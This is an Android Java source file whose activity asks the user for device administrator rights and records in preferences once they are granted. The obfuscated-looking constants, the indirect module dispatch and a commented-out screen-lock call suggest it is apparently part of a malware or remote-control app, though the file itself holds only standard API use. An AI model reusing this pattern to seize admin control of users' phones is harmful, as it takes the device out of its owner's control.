package com.moonny.acts;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;

import com.moonny.Modules;
import com.moonny.constants.S;
import com.moonny.rcvs.AdminRightsReceiver;


public class AdminActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getDeviceAdmin();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        finish();
    }

    private void getDeviceAdmin() {

        try {
            // Initiate DevicePolicyManager.
            DevicePolicyManager mDPM = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            // Set DeviceAdminDemo Receiver for active the component with different option
            ComponentName mAdminName = new ComponentName(this, AdminRightsReceiver.class);

            if (!mDPM.isAdminActive(mAdminName)) {
                // try to become active
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mAdminName);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, S.click_to_get_admin);
                startActivityForResult(intent, 100);
            } else {
                Modules.main(this, S.set_pref, new Object[]{ S.is_admin_active, true }) /* Prefs-Manager.set(this, S.is_admin_active, true) */;
                finish();
                // Already is a device administrator, can do security operations now.
                //mDPM.lockNow(); -- disable screen after some actions
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}